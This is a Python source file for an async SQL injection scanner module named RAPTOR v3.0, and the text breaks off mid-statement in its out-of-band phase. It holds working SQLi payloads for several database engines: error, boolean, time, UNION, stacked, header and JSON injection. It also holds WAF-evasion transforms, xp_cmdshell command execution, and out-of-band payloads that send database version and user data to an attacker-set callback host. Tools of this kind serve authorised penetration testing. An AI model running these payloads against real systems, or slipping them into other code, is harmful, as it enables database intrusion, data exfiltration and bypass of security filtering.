#!/usr/bin/env python3
"""
RAPTOR SQL Injection Testing Module v3.0
==========================================
Production-grade SQLi detection — zero external deps, full async.

Usage (CLI):
    python3 raptor.py -t example.com --modules sqli

What was improved over v2.0
────────────────────────────
1.  WAF fingerprinting      — named WAF detection (Cloudflare, ModSec, Akamai…)
2.  DB fingerprinting       — version/user/db extracted via error, UNION, blind
3.  Error-based             — expanded per-DB signatures + XPATH/CAST tricks
4.  Boolean-based           — proper diff engine with length + content ratio
5.  Time-based              — confirmation loop (3× with short delay cross-check)
6.  UNION-based             — ORDER BY column enumeration + string-column finder
7.  Stacked queries         — safe detection (no destructive payloads)
8.  OOB                     — DNS/HTTP callback payloads (if oob_callback set)
9.  Form testing            — POST form parameters tested for all techniques
10. Header injection        — User-Agent, Referer, X-Forwarded-For, Cookie
11. JSON body injection     — detects JSON endpoints and injects into values
12. Evasion engine          — comment insertion, case mixing, URL double-encode,
                              whitespace substitution, inline comments
13. Second-order detection  — stores payload, re-fetches profile page to check
14. Accurate false-positive — baseline ratio comparison (not just length)
"""

import re
import time
import json
import copy
import asyncio
import random
import hashlib
from difflib import SequenceMatcher
from typing import List, Dict, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote, urlencode

from core.base_module import BaseModule, Finding


# ══════════════════════════════════════════════════════════════════════════════
#  Payload dataclass
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class SQLiPayload:
    payload:    str
    technique:  str   # error | boolean | time | union | stacked | oob | second_order
    db_type:    str   # mysql | postgres | mssql | oracle | sqlite | generic
    indicator:  str   # regex or keyword to confirm
    severity:   str = 'High'
    evasion:    List[str] = field(default_factory=list)


# ══════════════════════════════════════════════════════════════════════════════
#  DB error signatures
# ══════════════════════════════════════════════════════════════════════════════

DB_ERRORS: Dict[str, List[str]] = {
    'mysql': [
        r'SQL syntax.*MySQL', r'Warning.*mysql_.*', r'MySqlClient\.',
        r'MySqlException', r'SQLSTATE\[\d+\].*Syntax error',
        r'check the manual that corresponds to your MySQL',
        r'You have an error in your SQL syntax',
        r'mysql_fetch_array\(\)', r'mysql_num_rows\(\)',
        r'supplied argument is not a valid MySQL',
        r'Column count doesn\'t match',
    ],
    'postgres': [
        r'PostgreSQL.*ERROR', r'Warning.*pg_.*', r'Npgsql\.',
        r'PG::Error', r'PSQLException', r'unterminated quoted string',
        r'pg_query\(\)', r'invalid input syntax for type',
        r'ERROR:.*syntax error at or near',
        r'operator does not exist',
    ],
    'mssql': [
        r'Microsoft.*ODBC.*SQL', r'SQL Server.*Driver', r'\[SQL Server\]',
        r'SqlException', r'System\.Data\.SqlClient',
        r'Unclosed quotation mark after the character string',
        r"'[^']*' is not a valid identifier",
        r'Msg \d+, Level \d+',
        r'Incorrect syntax near',
        r'ODBC SQL Server Driver',
    ],
    'oracle': [
        r'ORA-[0-9]{5}', r'Oracle error', r'Oracle.*Driver',
        r'quoted string not properly terminated',
        r'OracleException', r'oracle\.jdbc',
        r'invalid column index',
        r'java\.sql\.SQLException.*Oracle',
    ],
    'sqlite': [
        r'SQLiteException', r'sqlite3\.OperationalError',
        r'SQLite.*error', r'unrecognized token',
        r'near ".*": syntax error',
    ],
    'generic': [
        r'SQL syntax.*error', r'syntax error.*SQL',
        r'unclosed quotation mark', r'Warning.*odbc_',
        r'Warning.*mssql_', r'JET Database Engine',
        r'Access.*ODBC', r'ODBC.*Access',
        r'CLI Driver.*DB2', r'DB2 SQL error',
        r'Dynamic SQL Error', r'Warning.*ibase_',
        r'Unexpected end of command in statement',
        r'com\.mysql\.jdbc', r'Zend_Db_Adapter',
        r'JDBC.*error', r'jdbc\.SQLException',
    ],
}

# ══════════════════════════════════════════════════════════════════════════════
#  WAF signatures
# ══════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: Dict[str, List[str]] = {
    'Cloudflare':   [r'cloudflare', r'cf-ray', r'__cfduid'],
    'AWS WAF':      [r'aws.*waf', r'awselb', r'x-amzn-requestid'],
    'ModSecurity':  [r'mod_security', r'modsecurity', r'ModSecurity'],
    'Akamai':       [r'akamai', r'ak-hmac', r'x-akamai'],
    'Sucuri':       [r'sucuri', r'x-sucuri-id'],
    'Imperva':      [r'imperva', r'incapsula', r'x-iinfo'],
    'F5 BIG-IP':    [r'f5', r'bigip', r'x-wa-info'],
    'Barracuda':    [r'barracuda', r'barra_counter_session'],
    'Generic WAF':  [r'blocked', r'firewall', r'waf', r'security', r'forbidden'],
}

# ══════════════════════════════════════════════════════════════════════════════
#  DB-specific extraction queries
# ══════════════════════════════════════════════════════════════════════════════

DB_META: Dict[str, Dict] = {
    'mysql': {
        'version':  'SELECT @@version',
        'user':     'SELECT user()',
        'database': 'SELECT database()',
        'comments': ['-- ', '#', '/*!*/'],
        'sleep':    'SLEEP({t})',
        'stacked':  True,
    },
    'postgres': {
        'version':  'SELECT version()',
        'user':     'SELECT current_user',
        'database': 'SELECT current_database()',
        'comments': ['--', '/**/'],
        'sleep':    'pg_sleep({t})',
        'stacked':  True,
    },
    'mssql': {
        'version':  'SELECT @@version',
        'user':     'SELECT SYSTEM_USER',
        'database': 'SELECT DB_NAME()',
        'comments': ['--', '/**/'],
        'sleep':    "WAITFOR DELAY '0:0:{t}'",
        'stacked':  True,
    },
    'oracle': {
        'version':  'SELECT banner FROM v$version WHERE ROWNUM=1',
        'user':     'SELECT user FROM dual',
        'database': 'SELECT ORA_DATABASE_NAME FROM dual',
        'comments': ['--', '/**/'],
        'sleep':    "DBMS_PIPE.RECEIVE_MESSAGE('RDS',{t})",
        'stacked':  False,
    },
    'sqlite': {
        'version':  'SELECT sqlite_version()',
        'user':     'SELECT sqlite_version()',
        'database': 'SELECT name FROM sqlite_master LIMIT 1',
        'comments': ['--', '/**/'],
        'sleep':    'randomblob(100000000)',
        'stacked':  False,
    },
}

# ══════════════════════════════════════════════════════════════════════════════
#  Evasion transforms
# ══════════════════════════════════════════════════════════════════════════════

def _evasion_comment(payload: str) -> str:
    """Insert inline comment between keywords."""
    return payload.replace(' ', '/**/')

def _evasion_case(payload: str) -> str:
    """Randomise keyword case."""
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                'INSERT', 'UPDATE', 'DELETE', 'DROP', 'ORDER', 'BY',
                'SLEEP', 'WAITFOR', 'DELAY', 'CAST', 'CONVERT']
    result = payload
    for kw in keywords:
        result = re.sub(re.escape(kw), lambda _: ''.join(
            c.upper() if random.random() > 0.4 else c.lower() for c in kw
        ), result, flags=re.IGNORECASE)
    return result

def _evasion_double_url(payload: str) -> str:
    """Double URL-encode the payload."""
    return quote(quote(payload, safe=''), safe='')

def _evasion_whitespace(payload: str) -> str:
    """Replace spaces with tab / newline / URL-encoded equivalents."""
    replacements = ['\t', '\n', '%09', '%0a', '/**/']
    return payload.replace(' ', random.choice(replacements))

def _evasion_null_byte(payload: str) -> str:
    """Inject null byte before comment marker."""
    return payload.replace('--', '%00--')

EVASION_FNS = [
    _evasion_comment,
    _evasion_case,
    _evasion_whitespace,
    _evasion_double_url,
    _evasion_null_byte,
]


# ══════════════════════════════════════════════════════════════════════════════
#  Helper: response similarity  (used by boolean engine)
# ══════════════════════════════════════════════════════════════════════════════

def _similarity(a: str, b: str) -> float:
    return SequenceMatcher(None, a[:4000], b[:4000]).ratio()

def _length_ratio(a: str, b: str) -> float:
    la, lb = len(a), len(b)
    if la == 0 and lb == 0:
        return 1.0
    return min(la, lb) / max(la, lb) if max(la, lb) > 0 else 1.0


# ══════════════════════════════════════════════════════════════════════════════
#  SQLiTester
# ══════════════════════════════════════════════════════════════════════════════

class SQLiTester(BaseModule):
    """
    Advanced SQL Injection detection module — full async, zero extra deps.

    Invoked by raptor.py:
        async with SQLiTester(config, stealth, db, graph) as m:
            findings = await m.run(target, **kwargs)
    """

    # ── Init ─────────────────────────────────────────────────────────────────

    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.findings:        List[Finding] = []
        self.tested_params:   Set[str]      = set()
        self.waf_name:        Optional[str] = None
        self.detected_db:     Optional[str] = None

        # tunables
        self.time_delay           = config.get('blind_timeout',        5)
        self.boolean_threshold    = config.get('boolean_diff_threshold', 0.08)
        self.max_union_cols       = config.get('max_union_cols',       20)
        self.oob_callback         = config.get('oob_callback',         '')
        self.evasion_level        = config.get('evasion_level',         3)
        self.max_params           = config.get('max_params',           15)

        self.error_sigs   = DB_ERRORS
        self.db_meta      = DB_META

    # ── Context managers ─────────────────────────────────────────────────────

    async def __aenter__(self):
        self.logger.info('🔥 SQLi Module v3.0 initialising')
        return self

    async def __aexit__(self, *_):
        return False

    # ══════════════════════════════════════════════════════════════════════════
    #  Public entry point
    # ══════════════════════════════════════════════════════════════════════════

    async def run(self, target: str, **kwargs) -> List[Finding]:
        scope = kwargs.get('scope', 'standard')
        self.logger.info(f'🚀 SQLi scan → {target}  [scope: {scope}]')

        # Phase 1: WAF detection
        self.logger.info('🛡️  Phase 1: WAF detection')
        await self._detect_waf(target)

        # Phase 2: Parameter + form discovery
        self.logger.info('🔍 Phase 2: Parameter & form discovery')
        url_params, forms = await self._discover_params(target)

        # Phase 3: Error-based
        self.logger.info('💥 Phase 3: Error-based SQLi')
        await self._phase_error(target, url_params)

        # Phase 4: Boolean-based blind (standard+)
        if scope in ('standard', 'comprehensive', 'aggressive'):
            self.logger.info('🔀 Phase 4: Boolean-based blind SQLi')
            await self._phase_boolean(target, url_params)

        # Phase 5: Time-based blind (comprehensive+)
        if scope in ('comprehensive', 'aggressive'):
            self.logger.info('⏱️  Phase 5: Time-based blind SQLi')
            await self._phase_time(target, url_params)

        # Phase 6: UNION-based (aggressive)
        if scope == 'aggressive':
            self.logger.info('🔗 Phase 6: UNION-based SQLi')
            await self._phase_union(target, url_params)

        # Phase 7: Stacked queries (aggressive)
        if scope == 'aggressive':
            self.logger.info('📚 Phase 7: Stacked query detection')
            await self._phase_stacked(target, url_params)

        # Phase 8: Form POST testing (standard+)
        if scope in ('standard', 'comprehensive', 'aggressive') and forms:
            self.logger.info('📝 Phase 8: Form parameter testing')
            await self._phase_forms(forms)

        # Phase 9: Header injection
        self.logger.info('📡 Phase 9: Header-based SQLi')
        await self._phase_headers(target)

        # Phase 10: JSON body injection (comprehensive+)
        if scope in ('comprehensive', 'aggressive'):
            self.logger.info('📦 Phase 10: JSON body SQLi')
            await self._phase_json(target)

        # Phase 11: OOB (aggressive, callback required)
        if scope == 'aggressive' and self.oob_callback:
            self.logger.info('📡 Phase 11: OOB SQLi')
            await self._phase_oob(target, url_params)

        # Phase 12: Second-order (aggressive)
        if scope == 'aggressive':
            self.logger.info('♻️  Phase 12: Second-order SQLi')
            await self._phase_second_order(target, url_params)

        self.logger.info(f'✅ SQLi complete — {len(self.findings)} finding(s)')
        return self.findings

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 1 — WAF Detection
    # ══════════════════════════════════════════════════════════════════════════

    async def _detect_waf(self, target: str):
        noise = "' AND 1=1 UNION SELECT NULL--"
        resp  = await self._make_request(f'{target}?waf_probe={quote(noise)}')
        if not resp:
            return

        page    = await resp.text()
        code    = resp.status
        headers = str(resp.headers)
        combined = (page + headers).lower()

        if code >= 400:
            for name, patterns in WAF_SIGNATURES.items():
                if any(re.search(p, combined, re.I) for p in patterns):
                    self.waf_name = name
                    self.logger.warning(f'   ⚠️  WAF: {name} — evasion enabled')
                    return
            self.waf_name = 'Unknown WAF'
            self.logger.warning('   ⚠️  WAF detected (unrecognised)')

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 2 — Parameter & Form Discovery
    # ══════════════════════════════════════════════════════════════════════════

    async def _discover_params(self, target: str) -> Tuple[List[str], List[Dict]]:
        common = [
            'id', 'page', 'user', 'search', 'category', 'product',
            'order', 'sort', 'filter', 'q', 'query', 'name', 'email',
            'username', 'token', 'key', 'ref', 'lang', 'type', 'action',
            'item', 'pid', 'uid', 'sid', 'tid', 'aid', 'rid',
        ]

        # Start with params already in the URL
        parsed     = urlparse(target)
        url_params = list(parse_qs(parsed.query).keys())
        forms:     List[Dict] = []

        resp = await self._make_request(target)
        if not resp:
            return list(set(url_params + common))[:self.max_params], forms

        body = await resp.text()

        # Extract params from links
        for m in re.finditer(r'href=["\']([^"\']*\?[^"\']*)["\']', body):
            for k in parse_qs(urlparse(m.group(1)).query).keys():
                url_params.append(k)

        # Extract forms
        for m in re.finditer(r'<form(?P<attrs>[^>]*)>(?P<inner>.*?)</form>',
                             body, re.DOTALL | re.I):
            attrs = m.group('attrs')
            inner = m.group('inner')
            action_m = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            method_m = re.search(r'method=["\'](\w+)["\']', attrs, re.I)
            action = action_m.group(1) if action_m else target
            method = (method_m.group(1) if method_m else 'GET').upper()
            if not action.startswith('http'):
                action = urljoin(target, action)
            inputs = {}
            for inp in re.finditer(
                r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
                inner, re.I
            ):
                inputs[inp.group(1)] = inp.group(2) or ''
            for sel in re.finditer(r'<textarea[^>]+name=["\']([^"\']+)["\']', inner, re.I):
                inputs[sel.group(1)] = 'test'
            if inputs:
                forms.append({'action': action, 'method': method, 'inputs': inputs})

        all_params = list(dict.fromkeys(url_params + common))[:self.max_params]
        self.logger.info(f'   {len(all_params)} param(s), {len(forms)} form(s)')
        return all_params, forms

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 3 — Error-based SQLi
    # ══════════════════════════════════════════════════════════════════════════

    _ERROR_PAYLOADS = [
        # Generic triggers
        ("'",              'generic'),
        ('"',              'generic'),
        ("'--",            'generic'),
        ("'#",             'mysql'),
        # MySQL XPATH errors
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -", 'mysql'),
        ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- -",  'mysql'),
        ("' AND EXP(~(SELECT * FROM (SELECT @@version) t))-- -",            'mysql'),
        # PostgreSQL cast error
        ("' AND 1=CAST((SELECT version()) AS INTEGER)--",                   'postgres'),
        ("' AND 1=(SELECT 1/0)--",                                          'postgres'),
        # MSSQL conversion error
        ("' AND 1=CONVERT(INT,(SELECT @@version))--",                       'mssql'),
        ("' AND 1=@@version--",                                             'mssql'),
        # Oracle
        ("' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS INT)--", 'oracle'),
        ("' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--",          'oracle'),
        # SQLite
        ("' AND sqlite_version()--",                                        'sqlite'),
        # Generic
        ("'/**/AND/**/1=1--",                                               'generic'),
        ("1 EXEC xp_cmdshell('dir')--",                                     'mssql'),
    ]

    async def _phase_error(self, target: str, params: List[str]):
        sem = asyncio.Semaphore(5)

        async def test(param: str):
            async with sem:
                if param in self.tested_params:
                    return
                for raw_payload, db_hint in self._ERROR_PAYLOADS:
                    payloads_to_try = [raw_payload]
                    if self.waf_name:
                        payloads_to_try += [fn(raw_payload) for fn in EVASION_FNS[:self.evasion_level]]

                    for p in payloads_to_try:
                        url  = self._build_url(target, param, p)
                        resp = await self._make_request(url)
                        if not resp:
                            continue
                        body    = await resp.text()
                        db_type = self._match_error(body)
                        if db_type:
                            fp = await self._fingerprint(target, param, db_type)
                            self._emit(target, param,
                                       SQLiPayload(p, 'error', db_type, db_type, 'High'),
                                       'Error-based', fp, body)
                            self.tested_params.add(param)
                            return

        await asyncio.gather(*[test(p) for p in params], return_exceptions=True)

    def _match_error(self, body: str) -> Optional[str]:
        """Return DB type name if any error signature matches, else None."""
        for db, patterns in self.error_sigs.items():
            for pat in patterns:
                if re.search(pat, body, re.IGNORECASE):
                    return db
        return None

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 4 — Boolean-based Blind SQLi
    # ══════════════════════════════════════════════════════════════════════════

    # True / False condition pairs (true_payload, false_payload, db_hint)
    _BOOL_PAIRS = [
        ("' AND 1=1-- -",                "' AND 1=2-- -",                'generic'),
        ("' AND '1'='1'-- -",             "' AND '1'='2'-- -",            'generic'),
        ("1 AND 1=1",                     "1 AND 1=2",                    'generic'),
        ("' AND (SELECT 1)=1-- -",        "' AND (SELECT 1)=2-- -",       'generic'),
        ("' AND ASCII(SUBSTR(user(),1,1))>0-- -",
         "' AND ASCII(SUBSTR(user(),1,1))<0-- -",  'mysql'),
        ("' AND LENGTH(database())>0-- -","' AND LENGTH(database())<0-- -",'mysql'),
        ("' AND 1=1#",                    "' AND 1=2#",                    'mysql'),
        ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
         "' AND (SELECT COUNT(*) FROM information_schema.tables)<0-- -",   'mysql'),
        ("'; SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END--",
         "'; SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END--",                  'postgres'),
        ("' AND 1=(SELECT IIF(1=1,1,0))--","' AND 1=(SELECT IIF(1=2,1,0))--",'mssql'),
    ]

    async def _phase_boolean(self, target: str, params: List[str]):
        untested = [p for p in params if p not in self.tested_params]
        sem = asyncio.Semaphore(4)

        async def test(param: str):
            async with sem:
                # Get stable baseline (3 samples to filter dynamic content)
                baselines = []
                for _ in range(3):
                    r = await self._make_request(self._build_url(target, param, '1'))
                    if r:
                        baselines.append(await r.text())
                if not baselines:
                    return

                # Natural variance of baseline
                if len(baselines) >= 2:
                    nat_var = 1.0 - _similarity(baselines[0], baselines[-1])
                else:
                    nat_var = 0.0

                baseline = baselines[0]

                for true_p, false_p, db_hint in self._BOOL_PAIRS:
                    if self.waf_name:
                        true_p  = random.choice(EVASION_FNS[:self.evasion_level])(true_p)
                        false_p = random.choice(EVASION_FNS[:self.evasion_level])(false_p)

                    r_true  = await self._make_request(self._build_url(target, param, true_p))
                    r_false = await self._make_request(self._build_url(target, param, false_p))
                    if not r_true or not r_false:
                        continue

                    b_true  = await r_true.text()
                    b_false = await r_false.text()

                    if self._confirm_boolean(baseline, b_true, b_false, nat_var):
                        self._emit(target, param,
                                   SQLiPayload(true_p, 'boolean', db_hint, 'boolean', 'High'),
                                   'Boolean-based Blind', {}, '')
                        self.tested_params.add(param)
                        return

        await asyncio.gather(*[test(p) for p in untested], return_exceptions=True)

    def _confirm_boolean(self, baseline: str, true_r: str, false_r: str,
                         nat_var: float) -> bool:
        """
        True-condition should be similar to baseline.
        False-condition should differ meaningfully.
        Both differences must exceed the natural variance of the baseline.
        """
        sim_true  = _similarity(baseline, true_r)
        sim_false = _similarity(baseline, false_r)
        len_true  = _length_ratio(baseline, true_r)
        len_false = _length_ratio(baseline, false_r)

        # True condition close to baseline, false condition differs
        if (sim_true  > (1.0 - self.boolean_threshold)
                and sim_false < (1.0 - self.boolean_threshold * 3)
                and (sim_true - sim_false) > nat_var + self.boolean_threshold):
            return True

        # Length-based signal
        if (len_true  > 0.97
                and len_false < (1.0 - self.boolean_threshold * 2)
                and abs(len_true - len_false) > nat_var):
            return True

        return False

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 5 — Time-based Blind SQLi
    # ══════════════════════════════════════════════════════════════════════════

    def _time_payloads(self) -> List[Tuple[str, str]]:
        t = self.time_delay
        return [
            (f"' AND SLEEP({t})-- -",                                    'mysql'),
            (f"' AND (SELECT * FROM (SELECT(SLEEP({t})))x)-- -",         'mysql'),
            (f"'; SELECT pg_sleep({t})--",                               'postgres'),
            (f"' AND (SELECT 1 FROM PG_SLEEP({t}))--",                   'postgres'),
            (f"'; WAITFOR DELAY '0:0:{t}'--",                            'mssql'),
            (f"'; EXEC xp_cmdshell('ping -n {t} 127.0.0.1')--",         'mssql'),
            (f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{t})--",       'oracle'),
            (f"' AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{t}))--", 'oracle'),
            (f"' AND randomblob({t * 200000000})--",                     'sqlite'),
            # WAF-evasion variants (inline comment whitespace)
            (f"'/**/AND/**/SLEEP({t})/**/--",                            'mysql'),
            (f"'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP({t})))x)--", 'mysql'),
        ]

    async def _phase_time(self, target: str, params: List[str]):
        untested = [p for p in params if p not in self.tested_params]
        t = self.time_delay

        # Establish baseline response time (average of 3)
        async def baseline_time(url: str) -> float:
            times = []
            for _ in range(3):
                t0 = time.monotonic()
                r  = await self._make_request(url)
                times.append(time.monotonic() - t0)
            return sum(times) / len(times) if times else 1.0

        sem = asyncio.Semaphore(2)  # time-based needs low concurrency

        async def test(param: str):
            async with sem:
                base_url  = self._build_url(target, param, '1')
                base_time = await baseline_time(base_url)

                for payload, db_hint in self._time_payloads():
                    if self.waf_name:
                        payload = random.choice(EVASION_FNS[:self.evasion_level])(payload)

                    t0   = time.monotonic()
                    resp = await self._make_request(self._build_url(target, param, payload))
                    elapsed = time.monotonic() - t0

                    if elapsed < base_time + t * 0.75:
                        continue

                    # Confirmation: repeat with delay=1 — should be fast
                    short_p = payload.replace(str(t), '1')
                    t0_s    = time.monotonic()
                    await self._make_request(self._build_url(target, param, short_p))
                    short_elapsed = time.monotonic() - t0_s

                    if short_elapsed < base_time + 2.5 and elapsed >= base_time + t * 0.75:
                        # Second confirmation with original delay
                        t0_c = time.monotonic()
                        await self._make_request(self._build_url(target, param, payload))
                        confirm_elapsed = time.monotonic() - t0_c

                        if confirm_elapsed >= base_time + t * 0.7:
                            self._emit(target, param,
                                       SQLiPayload(payload, 'time', db_hint, 'delay', 'High'),
                                       'Time-based Blind',
                                       {'db_type': db_hint, 'measured_delay': round(elapsed, 2),
                                        'baseline_time': round(base_time, 2)}, '')
                            self.tested_params.add(param)
                            return

        await asyncio.gather(*[test(p) for p in untested], return_exceptions=True)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 6 — UNION-based SQLi
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_union(self, target: str, params: List[str]):
        untested = [p for p in params if p not in self.tested_params]
        sem = asyncio.Semaphore(4)

        async def test(param: str):
            async with sem:
                col_count = await self._count_columns(target, param)
                if col_count == 0:
                    return

                # Find string-output column
                str_col = await self._find_string_column(target, param, col_count)
                if str_col is None:
                    return

                # Extract DB banner
                marker  = 'RPTR_UNION_' + hashlib.md5(param.encode()).hexdigest()[:8]
                cols    = ['NULL'] * col_count
                cols[str_col] = f"CONCAT(0x{marker.encode().hex()},version(),0x{marker.encode().hex()})"

                union_p = f"0' UNION SELECT {','.join(cols)}-- -"
                resp    = await self._make_request(self._build_url(target, param, union_p))
                if not resp:
                    return
                body = await resp.text()

                db_type = self._match_error(body) or 'generic'
                version = ''
                vm = re.search(re.escape(marker) + r'(.*?)' + re.escape(marker), body)
                if vm:
                    version = vm.group(1)

                self._emit(target, param,
                           SQLiPayload(union_p, 'union', db_type, 'union_string', 'Critical'),
                           'UNION-based',
                           {'db_type': db_type, 'columns': col_count,
                            'string_col': str_col, 'version': version}, body)
                self.tested_params.add(param)

        await asyncio.gather(*[test(p) for p in untested], return_exceptions=True)

    async def _count_columns(self, target: str, param: str) -> int:
        """Use ORDER BY to count columns."""
        for n in range(1, self.max_union_cols + 1):
            payload = f"1' ORDER BY {n}-- -"
            resp    = await self._make_request(self._build_url(target, param, payload))
            if not resp:
                return n - 1
            body = await resp.text()
            if self._match_error(body) or resp.status not in (200, 302):
                return n - 1
        return 0

    async def _find_string_column(self, target: str, param: str, col_count: int) -> Optional[int]:
        """Find a column that outputs strings in a UNION."""
        for i in range(col_count):
            cols = ['NULL'] * col_count
            cols[i] = "'RPTR_STR_TEST'"
            payload = f"0' UNION SELECT {','.join(cols)}-- -"
            resp    = await self._make_request(self._build_url(target, param, payload))
            if resp:
                body = await resp.text()
                if 'RPTR_STR_TEST' in body:
                    return i
        return None

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 7 — Stacked Queries (detection only — no destructive payloads)
    # ══════════════════════════════════════════════════════════════════════════

    _STACKED_PAYLOADS = [
        # These SELECT-only payloads detect stacked support without destroying data
        ("'; SELECT 1-- -",             'generic'),
        ("'; SELECT @@version-- -",     'mysql'),
        ("'; SELECT version()--",       'postgres'),
        ("'; SELECT DB_NAME()--",       'mssql'),
        ("'; SELECT 1 FROM DUAL--",     'oracle'),
        ("'; SELECT sqlite_version()--",'sqlite'),
        # Time-confirm stacked
        ("'; SELECT SLEEP(2)-- -",      'mysql'),
        ("'; SELECT pg_sleep(2)--",     'postgres'),
        ("'; WAITFOR DELAY '0:0:2'--",  'mssql'),
    ]

    async def _phase_stacked(self, target: str, params: List[str]):
        untested = [p for p in params if p not in self.tested_params]
        sem = asyncio.Semaphore(3)

        async def test(param: str):
            async with sem:
                baseline_r = await self._make_request(self._build_url(target, param, '1'))
                if not baseline_r:
                    return
                baseline_body = await baseline_r.text()

                for payload, db_hint in self._STACKED_PAYLOADS:
                    t0   = time.monotonic()
                    resp = await self._make_request(self._build_url(target, param, payload))
                    elapsed = time.monotonic() - t0
                    if not resp:
                        continue
                    body = await resp.text()

                    # Stacked detected if: DB error gone + response differs, OR time delay hit
                    error_before = self._match_error(baseline_body)
                    error_after  = self._match_error(body)
                    time_based   = 'SLEEP' in payload or 'pg_sleep' in payload or 'WAITFOR' in payload

                    if time_based and elapsed >= 1.8:
                        self._emit(target, param,
                                   SQLiPayload(payload, 'stacked', db_hint, 'stacked_time', 'Critical'),
                                   'Stacked Queries',
                                   {'db_type': db_hint, 'evidence': 'time delay confirmed'}, body)
                        self.tested_params.add(param)
                        return
                    elif not time_based and not error_after and body != baseline_body:
                        self._emit(target, param,
                                   SQLiPayload(payload, 'stacked', db_hint, 'stacked_response', 'Critical'),
                                   'Stacked Queries',
                                   {'db_type': db_hint, 'evidence': 'response changed'}, body)
                        self.tested_params.add(param)
                        return

        await asyncio.gather(*[test(p) for p in untested], return_exceptions=True)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 8 — Form POST Testing
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_forms(self, forms: List[Dict]):
        sem = asyncio.Semaphore(3)

        async def test_form(form: Dict):
            async with sem:
                url    = form['action']
                method = form['method']
                inputs = form['inputs']

                for param in inputs:
                    for raw_payload, db_hint in self._ERROR_PAYLOADS[:8]:
                        test_inputs        = copy.deepcopy(inputs)
                        test_inputs[param] = raw_payload

                        if method == 'POST':
                            resp = await self._make_request(url, method='POST', data=test_inputs)
                        else:
                            resp = await self._make_request(
                                url + '?' + urlencode(test_inputs)
                            )

                        if not resp:
                            continue
                        body    = await resp.text()
                        db_type = self._match_error(body)
                        if db_type:
                            self._emit(url, param,
                                       SQLiPayload(raw_payload, 'error', db_type, db_type, 'High'),
                                       f'Error-based ({method} Form)',
                                       {'db_type': db_type, 'form_method': method}, body)
                            return

        await asyncio.gather(*[test_form(f) for f in forms], return_exceptions=True)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 9 — Header Injection
    # ══════════════════════════════════════════════════════════════════════════

    _INJECTABLE_HEADERS = [
        'User-Agent', 'X-Forwarded-For', 'X-Real-IP', 'Referer',
        'X-Forwarded-Host', 'Forwarded', 'X-Originating-IP',
        'X-Client-IP', 'CF-Connecting-IP', 'Cookie', 'Accept-Language',
    ]

    async def _phase_headers(self, target: str):
        for header in self._INJECTABLE_HEADERS:
            for raw_payload, db_hint in self._ERROR_PAYLOADS[:6]:
                resp = await self._make_request(target, headers={header: raw_payload})
                if not resp:
                    continue
                body    = await resp.text()
                db_type = self._match_error(body)
                if db_type:
                    self._emit(target, header,
                               SQLiPayload(raw_payload, 'error', db_type, db_type, 'High'),
                               'Header-based Error',
                               {'header': header, 'db_type': db_type}, body)
                    return

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 10 — JSON Body Injection
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_json(self, target: str):
        """Detect JSON API endpoints and inject SQLi into string values."""
        resp = await self._make_request(target)
        if not resp:
            return
        ct   = resp.headers.get('Content-Type', '')
        body = await resp.text()

        is_json = 'application/json' in ct
        has_json_links = bool(re.search(r'["\'](?:/api/|/json/|/rest/)', body))

        if not is_json and not has_json_links:
            return

        # Try to inject into common JSON shapes
        json_bodies = [
            {'id': "1'", 'query': "' OR '1'='1"},
            {'search': "' UNION SELECT NULL--"},
            {'username': "' OR 1=1--", 'password': 'anything'},
        ]

        for payload_body in json_bodies:
            for param, value in payload_body.items():
                resp2 = await self._make_request(
                    target, method='POST',
                    data=json.dumps({param: value}),
                    headers={'Content-Type': 'application/json'},
                )
                if not resp2:
                    continue
                body2   = await resp2.text()
                db_type = self._match_error(body2)
                if db_type:
                    self._emit(target, param,
                               SQLiPayload(value, 'error', db_type, db_type, 'High'),
                               'JSON Body SQLi',
                               {'db_type': db_type, 'content_type': 'application/json'}, body2)
                    return

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 11 — OOB SQLi
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_oob(self, target: str, params: List[str]):
        cb = self.oob_callback
        oob_payloads = [
            (f"' AND LOAD_FILE(CONCAT('\\\\\\\\',({{'SELECT @@version'}}),'.{cb}\\\\a'))-- -",
             'mysql'),
            (f"'; EXEC xp_dirtree '//{cb}/a'--",            'mssql'),
            (f"' UNION SELECT UTL_HTTP.REQUEST('http://{cb}/?x='||(SELECT user FROM dual)||'') FROM DUAL--",
             'oracle'),
            (f"' OR 1=(SELECT 1 FROM PG_READ_FILE('http://{cb}'))--", 'postgres'),
        ]
        for param in params[:5]:
            for payload, db_hint in oob_payloads:
                resp = await self._make_request(self._build_url(target, param, payload))
                if resp:
                    self._emit(target, param,
                               SQLiPayload(payload, 'oob', db_hint, 'oob', 'Critical'),
